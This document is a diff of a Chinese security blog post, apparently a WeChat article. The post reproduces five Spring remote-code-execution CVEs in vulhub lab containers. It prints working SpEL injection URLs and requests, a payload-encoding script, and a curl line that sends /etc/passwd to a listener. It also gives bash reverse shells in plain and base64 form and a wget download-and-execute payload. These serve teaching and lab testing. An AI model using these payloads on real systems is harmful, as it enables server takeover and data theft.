@@ -58,7 +58,7 @@ Spring 是一个开放源代码的设计层面框架，它是于 2003 年兴起�
 
 Spring 框架包含的功能大约由 20 个小模块组成。这些模块按组可分为核心容器 (Core Container)、数据访问 / 集成(Data Access/Integration)、Web、面向切面编程(AOP 和 Aspects)、设备(Instrumentation)、消息(Messaging) 和测试(Test)。如下图所示：
 
-![](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v5YIO2jUicZgOETEKtXTRSCOicgKSvyUgN9jMEEMkibgkbxyHiaUAabkUUZGibiaZBNKvhjSnUibjI9kPDvw/640?wx_fmt=png)
+![](../../.resource/remote/2038832a941915ae0e1ea35b88ce7fa4ba2c8eaf6dc072ca9056d00a4ad1e464.png)
 
 漏洞环境搭建
 ======
@@ -74,7 +74,7 @@ sudo apt install docker.io
 docker -v //查看是否安装成功
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v5YIO2jUicZgOETEKtXTRSCOg0Oe9icAlAebUPgm3tcRbKVibcmotFF4cKLj5PDXgWtNcfiaAvuARPM6g/640?wx_fmt=png)
+![](../../.resource/remote/fea48d51c6e6d1196254cd5876f6007f681c0910a02abc593d9f8bfe76bdcc4f.png)
 
 然后安装 python 和 pip 环境，命令如下
 
@@ -86,7 +86,7 @@ sudo python get-pip.py
 pip -V //查看是否安装成功
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v5YIO2jUicZgOETEKtXTRSCO2tib7moDrYxiaZPN5V5Ts4oYcbiaApPT64ryfkoP1qHPhhibQ4Kx8TiaKzQ/640?wx_fmt=png)
+![](../../.resource/remote/3e8f3bcec816da12a35b5b0b8e2bd5e2db272ef647b45017105b4544b4576f7c.png)
 
 然后再安装 docker-compose
 
@@ -96,9 +96,9 @@ sudo apt install docker-compose
 docker-compose -v
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v5YIO2jUicZgOETEKtXTRSCOgq3icW6hE8KqzV9CKXmKxSS3TKltkXDbj3fLu7Wicq8nbZuGxecj0WGQ/640?wx_fmt=png)
+![](../../.resource/remote/b23342b4fe313cb041fd10e620ceb48d3c7513d77baf7e52595bb514eddfa197.png)
 
-![](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v5YIO2jUicZgOETEKtXTRSCOblrCJfraeNFHPVJSSPBU5SrXfKhicBS4wiaGlRicdB8ZRNhTib97MDtxYw/640?wx_fmt=png)
+![](../../.resource/remote/37aaf52df1530c0f77ecfc26ee3e528f7b214408a8dcfea8dbc4f983fe2a5a5e.png)
 
 到这个地方 docker 环境就已经搭建好了，这时候需要从 github 上把 vulhub 的漏洞环境给 clone 下来，这里直接 clone 网不太好，我就直接下载下来了 copy 到了靶机上
 
@@ -108,7 +108,7 @@ git clone https://github.com/vulhub/vulhub.git
 
 下载好之后进入 spring 漏洞环境，这里看到有 5 个 CVE 漏洞，我们一个一个来
 
-![](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v5YIO2jUicZgOETEKtXTRSCOgRT7iaQIThzgAYQqR7qTicAK6gwq4iaibQQUSSMzfbm75WkUSpx8CbRRlQ/640?wx_fmt=png)
+![](../../.resource/remote/e77311d7b25cf883926efc73793e2af2137a2988f7aaeae659e8203372ca0dac.png)
 
 cve-2016-4977
 =============
@@ -127,7 +127,7 @@ Spring Security OAuth RCE(cve-2016-4977)，是为 Spring 框架提供安全认�
 
 这里直接查看补丁情况
 
-![](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v5YIO2jUicZgOETEKtXTRSCOaHoyZCjrj4WJojo8gwf8jrpq9YIzVlvUp8hbunmia78WD2s8h7WIPmw/640?wx_fmt=png)
+![](../../.resource/remote/9c2b5c55e946f9ab8c94d4638550fc3dad528f7fa208f265fec3f4902104ef17.png)
 
 可以看到在第一次执行表达式之前程序将`$`替换成了由`RandomValueStringGenerator().generate()`生成的随机字符串，也就是`${errorSummary} -> random{errorSummary}`，但是这个替换不是递归的，所以`${2334-1}`并没有变。
 
@@ -140,7 +140,7 @@ Spring Security OAuth RCE(cve-2016-4977)，是为 Spring 框架提供安全认�
 
 首先进入 CVE-2016-4977 的 docker 环境
 
-![](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v5YIO2jUicZgOETEKtXTRSCOjJjbJ7qicaYYOX7ibylOTaABZsicV6jYXQmKutXrAb5nrXlia1UG0pUC0g/640?wx_fmt=png)
+![](../../.resource/remote/55792e7b77be2bc0aaa6d233677303f59261a357470fa943ab2b83c000266792.png)
 
 访问 url，输入 admin/admin
 
@@ -148,11 +148,11 @@ Spring Security OAuth RCE(cve-2016-4977)，是为 Spring 框架提供安全认�
 http://192.168.1.10:8080/oauth/authorize?response_type=${233*233}&client_id=acme&scope=openid&redirect_uri=http://test
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v5YIO2jUicZgOETEKtXTRSCOvo2DAJYpPkhTGQ61jdJBQgicFpHNvSduzgbTdLG2ev4S0445ibuicHp1Q/640?wx_fmt=png)
+![](../../.resource/remote/559d257d9e0c436b9d186b5c9e8962e29b6009963e4763bbaa086bed6aed8272.png)
 
 出现以下界面则存在漏洞
 
-![](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v5YIO2jUicZgOETEKtXTRSCOafvzcTZenMAleMkrX4IecNRZXvL1kS5KAibYdate5ibs0OpUxLvrlV0g/640?wx_fmt=png)
+![](../../.resource/remote/c8adf309f60996f8bf9baf1312482b1daa9bb0c3371f2b8f657bb1c9d186c470.png)
 
 使用 github 上找到的 poc 对传入值进行处理
 
@@ -160,11 +160,11 @@ http://192.168.1.10:8080/oauth/authorize?response_type=${233*233}&client_id=acme
 #!/usr/bin/env pythonmessage = input('Enter message to encode:')poc = '${T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(%s)' % ord(message[0])for ch in message[1:]: poc += '.concat(T(java.lang.Character).toString(%s))' % ord(ch)poc += ')}'print(poc)
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v5YIO2jUicZgOETEKtXTRSCOicX8wEEu1afsvrQcLJjcUiaR3Gv7tUYjNMibhNI2a9MHBYQ7iaxuPdNicFQ/640?wx_fmt=png)
+![](../../.resource/remote/5805177fed3f27a7d98e7d55bfaebac687e76dc9a57f84fbfd24206f83849d9e.png)
 
 这里我传入一个 whoami，返回了一个 payload
 
-![](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v5YIO2jUicZgOETEKtXTRSCOVbWsHibdjMIOPXWujj7z9LPOzTLPwN1gjNGFQd9bia7wObg0z5ic19FNA/640?wx_fmt=png)
+![](../../.resource/remote/56842696802058a36672e4d54cd8ae2be4b235f498bc935e84e4e0b9012c3349.png)
 
 将这个 payload 拼接到之前的网址里面访问可以发现，这里返回了一个`[java.lang.UNIXProcess@f2e3e13]`，说明代码已经执行了
 
@@ -172,7 +172,7 @@ http://192.168.1.10:8080/oauth/authorize?response_type=${233*233}&client_id=acme
 http://127.0.0.1:8080/oauth/authorize?response_type=${T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(119).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(111)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(109)).concat(T(java.lang.Character).toString(105)))}&client_id=acme&scope=openid&redirect_uri=http://test
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v5YIO2jUicZgOETEKtXTRSCOicQKmGFD3LtKZbOuKLeYNicPase9gl5o9rW4oGYcRUdeft20GxXkgY1g/640?wx_fmt=png)
+![](../../.resource/remote/7a00078c953b9630f3b45ea284a2134cfb94be47d710c32b132e8d58fe1df9c1.png)
 
 这里使用 curl 发送一个请求即可得到回显得内容
 
@@ -180,11 +180,11 @@ http://127.0.0.1:8080/oauth/authorize?response_type=${T(java.lang.Runtime).getRu
 curl 192.168.1.2:5555 -d "$(cat /etc/passwd)"
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v5YIO2jUicZgOETEKtXTRSCOrsX4woxANssR2cLa1ziboAHyQvkjZpaACxTx8lbntUBarGQrEtibYXHg/640?wx_fmt=png)
+![](../../.resource/remote/7a3549225fbf224e7b7738751076b733f0ed601f274c89a818b0bfda2ae77342.png)
 
 这里再使用 nc 监听尝试反弹 shell
 
-![](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v5YIO2jUicZgOETEKtXTRSCOISY9bwQNkVSUAj6FcL7ibr0xapRgP07LJxxUDoTNibibf6mpNRsJia3iaaw/640?wx_fmt=png)
+![](../../.resource/remote/a1036b16532227d81e806769779812bdcb589f6b9313a01248e2138e1f678cc8.png)
 
 使用到 bash 反弹，这里需要绕过 exec() 变形
 
@@ -194,11 +194,11 @@ bash -i >& /dev/tcp/192.168.1.2/5555 0>&1
 
 使用 http://www.jackson-t.ca/runtime-exec-payloads.html 进行 payload 处理
 
-![](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v5YIO2jUicZgOETEKtXTRSCOOTv99VfWInBW7xPuaXT75R3cPkt6aLf4rwmeUXmuIS8BICpMf4S5LQ/640?wx_fmt=png)
+![](../../.resource/remote/9c6743216b968e61c114d2456d202790d87fa10aea214c78bd5ae3b70baf5c06.png)
 
 将处理后的命令再放入 poc.py
 
-![](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v5YIO2jUicZgOETEKtXTRSCOoB4g1OlhIFJxMZrVfRrWowNaiadB4hf1adeDku7bIYGwBYgl0JzwKTg/640?wx_fmt=png)
+![](../../.resource/remote/872fb6049de287f4e86cfa200e4402bd107893cca36b95b55cf4ed60c8d0c444.png)
 
 得到新的 payload 并拼接到网址里面
 
@@ -208,7 +208,7 @@ http://127.0.0.1:8080/oauth/authorize?response_type=${T(java.lang.Runtime).getRu
 
 然后再访问这个网站即可得到反弹 shell
 
-![](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v5YIO2jUicZgOETEKtXTRSCO0dA6YH2HIAyVYkTusufBn8CU1VJyvZsMTYeForztrdF2GfiacbBb3qw/640?wx_fmt=png)
+![](../../.resource/remote/27228aade808d788bb0cf8764b211fea63b860a14fe17b7aada801c8dec2fba4.png)
 
 CVE-2017-4971
 =============
@@ -225,52 +225,52 @@ Spring Web Flow 框架远程代码执行 (CVE-2017-4971) 漏洞，是由于 Spri
 
 view 对象处理用户事件，会根据 HTTP 参数绑定相应的 model
 
-![](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v5YIO2jUicZgOETEKtXTRSCOTlNmuleiaj8ltn1uicfDgIn3ialbMQoib1nEHCicEqsuAymxBojlL7G0TyQ/640?wx_fmt=png)
+![](../../.resource/remote/14c73268b43e16c44eea5515d97cc409e60fb35f9254f3e8a7aa8af2904346ed.png)
 
 如果 model 没有设置`BinderConfiguration`, 则会调用`addDefaultMappings`函数
 
-![](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v5YIO2jUicZgOETEKtXTRSCOIqTjaOKnicTAiaMhuXuvgNFfNtWawPV8fqdwwtricWbtNxWqgf0zlvfOg/640?wx_fmt=png)
+![](../../.resource/remote/ee053ff6e5be3d581b7c2eeec8dc304f6546022c5f16d7d9030127e4cf31aaeb.png)
 
 进一步查看`addDefaultMappings`函数，可以发现输入参数以`fieldMarkerPrefix`(“_”) 开头，则会调用`addEmptyValueMapping`函数
 
-![](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v5YIO2jUicZgOETEKtXTRSCOUpOBMbt6mkGXfj0Q2qQhMr0D8TjHmjNMDPa2oPe68djP5SzXx6ABKA/640?wx_fmt=png)
+![](../../.resource/remote/163327253b5e0a05847dd498587826b3f86d4b02784f35b25e3cd9230e922d43.png)
 
 若`useSpringBeanBinding`参数设置为`false`, 则 `expressionParser`将设置为`SpelExpressionParser`对象的实例，而不是`BeanWrapperExpressionParser`对象的实例。当调用`getValueType`函数时，`SpelExpressionParser`对象将执行表达式，触发任意代码执行
 
-![](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v5YIO2jUicZgOETEKtXTRSCOpkR64SNWmMBmq14xSJ4qt3UOl99nIMOua06g1tRvrhZRt2IEWSRAFQ/640?wx_fmt=png)
+![](../../.resource/remote/282cc8665078baea62a03723f9ce64062c1c1b472f683a84056216d0ec63e388.png)
 
 漏洞复现
 ----
 
 首先进入 CVE-2017-4971 的 docker 环境
 
-![](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v5YIO2jUicZgOETEKtXTRSCORxX6ibysxfcgmNJ7nz74bryia9gdcNmFz22elIMFqRZ0tnR3B37XCBkg/640?wx_fmt=png)
+![](../../.resource/remote/c721381589ff0ab29296af6bcab8fa0b7089f08d953480983d9273001f5c83dd.png)
 
-点击登录![](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v5YIO2jUicZgOETEKtXTRSCOOq8oVhNz9C4v642clEhoGoqialbbfSTiaSadUicv7H7Ia16hMvhOXXe4A/640?wx_fmt=png)
+点击登录![](../../.resource/remote/16799af4fe607732b1fc0d3f6c6ead8cf2e3efd457553deb8b158b5eabf96455.png)
 
 这里列出了一些登录账户，这里随便使用一个登录即可
 
-![](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v5YIO2jUicZgOETEKtXTRSCOp9K18eCf4MLibiaXoUo5gib0UNcPRhFBwu7qUcicJVWBHHVOC1aGdEIzXw/640?wx_fmt=png)
+![](../../.resource/remote/e9405a5e14cee700b6e07a6f36c3b933bc076c89f1c201b4500b515f1b690c4e.png)
 
 登录之后显示如下界面
 
-![](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v5YIO2jUicZgOETEKtXTRSCOBvHSiantP4GsiaLQtNzePS7c7t1GEeMkzVwjMlnOCELF1BYyrUK9Qjrg/640?wx_fmt=png)
+![](../../.resource/remote/1837d9ef864d61ae6ffe9b37f18b797b667bb81adfa04271e858ad80a6b08321.png)
 
 然后访问 http://192.168.1.10:8080/hotels/1，点击`Book Hotel`
 
-![](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v5YIO2jUicZgOETEKtXTRSCOFNMv6kO23wuNEhpL0nrNsshXibHw5K3BeFyKQE7Ip4NesHo5XL9OBVQ/640?wx_fmt=png)
+![](../../.resource/remote/f070d1f2aa1d4f83d151ec29d39ca02f671e44b7124d62a51bbd9e18a9f28bef.png)
 
 这里要把信用卡和名字都填一下，然后点击`Proceed`
 
-![](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v5YIO2jUicZgOETEKtXTRSCODd73Liak2133cSfCiaOoBMuztY0macicBMMP0gKyFgLAXy7MpVU7By0wQ/640?wx_fmt=png)
+![](../../.resource/remote/6c346140ae1850addd7eda0aa73a55fcd5665019a20e2491576c979e7b7e1644.png)
 
 进入如下页面，此处用 bp 抓包
 
-![](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v5YIO2jUicZgOETEKtXTRSCOcRObHg6Ezw0umFKHeP3H5av0piavv0ErNxLibybrv9uNvkeKIK5qmVjA/640?wx_fmt=png)
+![](../../.resource/remote/d4e1b00bf40a612a1a35fcead3e09af00188d2399a99584dbf526feb3077931b.png)
 
 bp 抓包如下所示
 
-![](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v5YIO2jUicZgOETEKtXTRSCOJp097qAtG5ibUKyyhwUvu3wLeuTBs4ByHcm4UFae5U3F4Ywswia4PibUw/640?wx_fmt=png)
+![](../../.resource/remote/f601f5e5477c6d49b54e525f6c05348110453c34181fe9c7402322017118b89b.png)
 
 这里构造一个 bash 反弹的 payload
 
@@ -280,15 +280,15 @@ bp 抓包如下所示
 
 打开 nc 监听端口
 
-![](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v5YIO2jUicZgOETEKtXTRSCOMwH91tZ1o6icCG9DFqK7xMSQakFia1PelS01icJicfqXLXYbRtX2vY8icTg/640?wx_fmt=png)
+![](../../.resource/remote/df0ba998cc40a25c240697064e64367b8c95dccf344bcf52eb026bcd847ecfb6.png)
 
 把构造的 payload 放入抓到的包里发送
 
-![](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v5YIO2jUicZgOETEKtXTRSCO75nuFJbYO8D88ibibu36gkQTS64icohZASHQughEFIXGUd3mnbqtTCIGg/640?wx_fmt=png)
+![](../../.resource/remote/57a815ce980b6c48ae2ab1b953a4ec865856b4031f6ef1f5a80d23b918423428.png)
 
 即可收到反弹 shell
 
-![](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v5YIO2jUicZgOETEKtXTRSCOeNibZ4r4VdatuyufgW6SfPyiaSQ7GcsRtIatPqshelqFd2FhMsnqyuiaQ/640?wx_fmt=png)
+![](../../.resource/remote/e2c9ad41b4dad4125c055824e229d2bc4c140a1abf72a6fb5cac6317671e1985.png)
 
 CVE-2017-8046
 =============
@@ -305,18 +305,18 @@ Spring Data REST versions < 2.5.12, 2.6.7, 3.0 RC3 Spring Boot version < 2.0.0M4
 
 这里直接从补丁分析，从官方的描述来看就是就是 Spring-data-rest 服务处理 PATCH 请求不当，导致任意表达式执行从而导致的 RCE。首先来看下补丁，主要是 evaluateValueFromTarget 添加了一个校验方法 verifyPath，对于不合规格的 path 直接报异常退出，主要是 property.from(pathSource,type) 实现，基本逻辑就是通过反射去验证该 Field 是否存在于 bean 中
 
-![](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v5YIO2jUicZgOETEKtXTRSCOmnLj8dqelvSgFsO1sLn00BYKIFo7p2n0DxDyJvdl63a59ktJ1sqj9w/640?wx_fmt=png)
+![](../../.resource/remote/52e91a7a04644b13f863d5277e2bfdf853c5ea0d4586e606fdf6e62b0b139aba.png)
 
 漏洞复现
 ----
 
 进入 CVE-2017-8046 的 docker 环境
 
-![](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v5YIO2jUicZgOETEKtXTRSCO0oO25oicEQLia9pJDW7Fos3bB9AVrXbMBIWJmq92dTtOLyJtfqACTxxw/640?wx_fmt=png)
+![](../../.resource/remote/9252069f1926a5dc43243747f05d2f598e91a6003273f7a20b82194ed1efb60a.png)
 
 访问 http://192.168.1.10:8080/customers/1 返回如下界面则存在漏洞
 
-![](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v5YIO2jUicZgOETEKtXTRSCOZiaEs9BgOEXYA1ZUvGic9pFWmN0TDtenPHC9CG0sY2IpgCLsiakw8bibbw/640?wx_fmt=png)
+![](../../.resource/remote/2695a4f50956114dfba1199502fb76ac9d905e4cb3db8e27e70b6c8dd170bab5.png)
 
 这里先对`customers/1`这个页面 bp 抓包，还是通过 bash 反弹，通过处理后得到命令
 
@@ -332,7 +332,7 @@ bash -i >& /dev/tcp/192.168.1.2/5555 0>&1bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3Rjc
 ",".join(map(str, (map(ord,"bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMi81NTU1IDA+JjE=}|{base64,-d}|{bash,-i}"))))
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v5YIO2jUicZgOETEKtXTRSCO5ZVjtGNzQib8okdDFicSMkvMKS2v88wggp1A9FHKcKUjmXWLficqHEtibQ/640?wx_fmt=png)
+![](../../.resource/remote/3387b87b1147cb8687d33ab9dba3f3af3c56ff3afa490af6454f582ad03abcc9.png)
 
 得到十进制后放入 bp 包里面进行构造
 
@@ -342,11 +342,11 @@ bash -i >& /dev/tcp/192.168.1.2/5555 0>&1bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3Rjc
 
 构造后如图所示
 
-![](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v5YIO2jUicZgOETEKtXTRSCOSQf8QN3XK9hLE30KCIEf85USCyGGnjVNnpmOzVjn1nFoKuawwUdVhA/640?wx_fmt=png)
+![](../../.resource/remote/5dd456888fc5f2365a2ba114516b60e4b51d30e263e8a7f4187f4e61ace49069.png)
 
 发包即可得到反弹 shell
 
-![](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v5YIO2jUicZgOETEKtXTRSCOAteL1ibKhQibxKDgWmDBjtO5no9O5Bx88QibRt2jwFkURBGH6UIdbkJSg/640?wx_fmt=png)
+![](../../.resource/remote/f1820e10f039b24d0d7f34284e2c1a5e606c768fb7a80fc9db98152e41e34953.png)
 
 CVE-2018-1270
 =============
@@ -363,7 +363,7 @@ Spring Framework 5.0 - 5.0.5 Spring Framework 4.3 - 4.3.15
 
 由`expression`，`getValue`，`setValue`造成的代码执行，造成这种命令执行是由 Spring 的 SPEL 表达式造成的
 
-![](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v5YIO2jUicZgOETEKtXTRSCOD4Z5SJThOcOVSEEGOlJG9LqibGmSOYZLnlS4xjcicOY6MsVvVOVJ5eLA/640?wx_fmt=png)
+![](../../.resource/remote/cdda47d1053bb9df307b6c8c2893c25f8b243da7c01af6a4d8c151e98c026ebd.png)
 
 SPEL 命令执行有两种方式，一是静态方法，二是 new 对象
 
@@ -380,11 +380,11 @@ Expression expression = sub.getSelectorExpression();if (expression == null) {   
 
 进入 CVE-2018-1270 的 docker 漏洞环境
 
-![](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v5YIO2jUicZgOETEKtXTRSCOickEgSy5bm9kOwrd2BhZYOHBwvO537FKZHJ2sg5TzPdufEnlNguNRfg/640?wx_fmt=png)
+![](../../.resource/remote/71397f0babd88377ae795ba4e278f56616a357bfb87f88a554962c9a6c13123e.png)
 
 访问 http://192.168.1.10:8080/gs-guide-websocket
 
-![](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v5YIO2jUicZgOETEKtXTRSCOiaS8iaMwe7uzt2BXbTKMLQc3rSvlC7Kfqk8Y1lzDZnmQjYs2vIgZPkVQ/640?wx_fmt=png)
+![](../../.resource/remote/8ffd031879d8ebb535313e6baad5c7593c3290dc0d2ffd7ef546641acfebb4ed.png)
 
 这里直接使用前辈们写好的 exp，注意修改一下 bash 命令和靶机地址即可
 
@@ -394,7 +394,7 @@ Expression expression = sub.getSelectorExpression();if (expression == null) {   
 
 首先还是 bash 编码
 
-![](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v5YIO2jUicZgOETEKtXTRSCOHxx6Bj5EftvYhHjK7vibD2znMibl6qTjA8GBJh1JYLNDT5hIibj6CzFKg/640?wx_fmt=png)
+![](../../.resource/remote/513700fe921bc1161b726136a633569e80a7373a04a5f8b4063b8a4d4dbae123.png)
 
 修改 exp 中的靶机 ip 和反弹命令
 
@@ -404,11 +404,11 @@ sockjs = SockJS('http://192.168.1.10:8080/gs-guide-websocket')sockjs.send('subsc
 
 如图所示
 
-![](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v5YIO2jUicZgOETEKtXTRSCOnXIevXLj2T7KDXxsjmknicS7Y99BGqgzRNHiao31d8nb4rvicNbc7eZNA/640?wx_fmt=png)
+![](../../.resource/remote/794efa5c2bc1690e9ea17db64da59e095a77ba22b2e3ba504b2dc134daf7c1ea.png)
 
 运行 poc.py 即可得到反弹 shell
 
-![](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v5YIO2jUicZgOETEKtXTRSCOwsb8OqaNAgG0FnFdgtC3Oc7eMya7sZcF0rEx9BK4hU4KHhNpGCzPicQ/640?wx_fmt=png)
+![](../../.resource/remote/d1ac1f9ae6575e3f03e8c1a7bbd53b9c054537e66faefe1bcf330cd5b5024750.png)
 
 CVE-2018-1273
 =============
@@ -425,7 +425,7 @@ Spring Data Commons 1.13 - 1.13.10 (Ingalls SR10) Spring Data REST 2.6 - 2.6.10 
 
 这里直接看补丁进行分析，这是一个 spel 表达式注入漏洞。补丁的内容如下：
 
-![](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v5YIO2jUicZgOETEKtXTRSCOqbufE1OYpB6w9GP8Fc7bcCyUcu69EE6SByCvowd6t2AWt5AKOia0vtA/640?wx_fmt=png)
+![](../../.resource/remote/6461f1151ec671d59cd9ee11f73c7815f009582c16f01cec9575223c3006caf0.png)
 
 补丁大致就是将 StandardEvaluationContext 替代为 SimpleEvaluationContext，由于 StandardEvaluationContext 权限过大，可以执行任意代码，会被恶意用户利用。
 
@@ -436,15 +436,15 @@ SimpleEvaluationContext 的权限则小的多，只支持一些 map 结构，通
 
 首先进入 CVE-2018-1273 的 docker 环境
 
-![](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v5YIO2jUicZgOETEKtXTRSCOzWtU8sicVnWQRib2GMAvIFbsWyLVSTg7vcyhWFHm4WL18lSa15Q4YgQw/640?wx_fmt=png)
+![](../../.resource/remote/bb244119dd1b2125c98694dee7ff52c32d4cee739d26c379e469abebb99e01e0.png)
 
 访问 http://192.168.1.10:8080/users 并用 bp 抓包
 
-![](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v5YIO2jUicZgOETEKtXTRSCO8UKkSGWOsRKB3OLTNvUptGHKulcJR6UzicdNoetnGek9xS2CTfjXWNA/640?wx_fmt=png)
+![](../../.resource/remote/0c0771e4ccca2cc3b14c916c2a8f83e88a0676a91755a5400201369f8efcb3f8.png)
 
 这里随便填一下 Username 跟 Password
 
-![](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v5YIO2jUicZgOETEKtXTRSCOQLehjgZsNujqQCWLAXveoSolfnfWdoHZGby5zq5RHiap3w5LEnLEUYQ/640?wx_fmt=png)
+![](../../.resource/remote/e8fe1e04c931c0bde8ed1dd2bc9eabbd70f7662d9b7d947914c4e86cec1e9e33.png)
 
 生成一个 shell.sh 文件
 
@@ -452,7 +452,7 @@ SimpleEvaluationContext 的权限则小的多，只支持一些 map 结构，通
 bash -i >& /dev/tcp/192.168.1.2/5555 0>&1
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v5YIO2jUicZgOETEKtXTRSCObAekzeKXSxGjoI9VD7kNnTLCutgCa4MAAGaicAWRGOaRB5Oaic5OKoqA/640?wx_fmt=png)
+![](../../.resource/remote/abb37897237d169b66b1441d06983a3098c63a3f0f5e283a65136b02a8911d1f.png)
 
 用 python 起一个 http 服务，并构造 payload 下载 shell.sh 文件保存在 / tmp / 目录下，名称为 1
 
@@ -460,7 +460,7 @@ bash -i >& /dev/tcp/192.168.1.2/5555 0>&1
 username[#this.getClass().forName("java.lang.Runtime").getRuntime().exec("/usr/bin/wget -qO /tmp/1 http://192.168.1.2:8000/shell.sh")]=111&password=111&repeated=111&Password=111
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v5YIO2jUicZgOETEKtXTRSCOoJSB762scHe56eLoLJHoEWUKelIEPouGJh5p44uriaBib77ZGIUjocgQ/640?wx_fmt=png)
+![](../../.resource/remote/6783accbb2c7d0b86fa47e8260ae51510f62048b8f2955d2f830090da1539797.png)
 
 nc 打开端口监听再构造 payload 进行命令执行即可收到反弹 shell
 
@@ -468,11 +468,11 @@ nc 打开端口监听再构造 payload 进行命令执行即可收到反弹 shel
 username[#this.getClass().forName("java.lang.Runtime").getRuntime().exec("/bin/bash /tmp/1")]=111&password=111&repeated=111&Password=111
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v5YIO2jUicZgOETEKtXTRSCOOqLrXTZf7IXHcvUickuzXQnTrFEFwPg5ueKlvQpAX2N7RIw7dxmetqg/640?wx_fmt=png)
+![](../../.resource/remote/38bd3c174232b940c3a802919a860b5195e38389ae890edf4d012dc5ffcc571d.png)
 
 加下方 wx，拉你一起进群学习
 
-![](https://mmbiz.qpic.cn/mmbiz_jpg/ibZ6uZjjH3v4WZgYJeibL4XoXol2MibfTeNPUTuUmqkgMFFf3icptn2CEN5kJEOOPWMg7STl235fSLQMgQ8GuSmWSg/640?wx_fmt=jpeg)
+![](../../.resource/remote/ebaf7990892e359dcac53556aa0a94a05858e409d2d40bad57c2787baaa038ad.jpg)
 
 往期推荐
 
@@ -540,9 +540,9 @@ windows 消息机制详解
 
 ](https://mp.weixin.qq.com/s?__biz=Mzg2NDY2MTQ1OQ==&mid=2247497473&idx=1&sn=b56bc8bf42442f8917f5903f470fbc77&chksm=ce674dbdf910c4ab7b5b8205d29e381774b69f3a4e8c23fdad5da0eaba7cc0d8f00f95d7c03b&scene=21#wechat_redirect)
 
- ![](http://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v6flNJqwg2VJrVbXvO9N2mzz6piagicPIiaCNPGH1tNA1N43RLy5bLY4PyUqNGYocicJMqrusALD0icibkg/0?wx_fmt=png) ** 红队蓝军 ** 一群热爱网络安全的人，知其黑，守其白。不限于红蓝对抗，web，内网，二进制。 78 篇原创内容  公众号
+ ![](../../.resource/remote/55f308d098bfa107cc98f20cc1f768d132358ccc277455c9691cf54a5b9f94b7.png) ** 红队蓝军 ** 一群热爱网络安全的人，知其黑，守其白。不限于红蓝对抗，web，内网，二进制。 78 篇原创内容  公众号
 
-![](https://mmbiz.qpic.cn/mmbiz_gif/ibZ6uZjjH3v7LQZwTb4qED3KvozKicnJd9ejpVoCntCRqf53IiaK2T3myzcUn5sswkUPfpQj1KHAALFcMFNYjfriaw/640?wx_fmt=gif)
+![](../../.resource/remote/e85460cd8b12a173b067fde19cd94238f71deaa9f92e91a3b77b4693fb898ce4.gif)
 
 ---
 
